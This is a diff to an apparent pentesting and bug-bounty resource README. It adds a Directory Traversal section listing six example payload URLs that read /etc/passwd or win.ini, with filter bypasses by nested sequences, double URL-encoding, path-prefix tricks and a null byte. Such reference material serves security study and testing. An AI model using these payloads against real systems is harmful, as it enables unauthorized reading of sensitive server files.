@@ -14,6 +14,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Open Redirect](#open-redirect)
 - [SSRF](#ssrf)
 - [Authentication vulnerabilities](#authentication-vulnerabilities)
+- [Directory Traversal](#directory-traversal)
 - [DLL Hijacking](#dll-hijacking)
 - [GraphQL](#graphql)
 - [WordPress](#wordpress)
@@ -204,6 +205,15 @@ Common Spots:
 - [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
 - [Password reset](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
 - [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
+
+### Directory Traversal
+
+- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
+- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
+- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
+- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
+- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
+- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
 
 ### DLL Hijacking
 
